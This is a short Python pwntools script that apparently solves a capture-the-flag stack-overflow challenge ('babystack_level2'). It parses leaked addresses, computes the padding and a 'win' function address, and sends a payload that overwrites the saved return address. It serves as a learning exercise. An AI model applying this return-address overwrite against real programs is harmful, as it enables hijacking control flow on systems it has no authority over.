from pwn import *

r = process("/challenge/babystack_level2")

r.recvuntil(b"Curent Return Address: ")
rip_savd = int(r.recvline(keepends=False), 16)

r.recvuntil(b"base pointer rbp: ")
bp = int(r.recvline(keepends=False), 16)

r.recvuntil(b"will be stored: ")
buf = int(r.recvline(keepends=False), 16)

padding = bp-buf+8
print(padding)

win_addr = rip_savd - 0x1627 + 0x12f0
print(win_addr)

payload = b'a'*padding + p64(win_addr)

r.sendline(payload)

r.interactive()
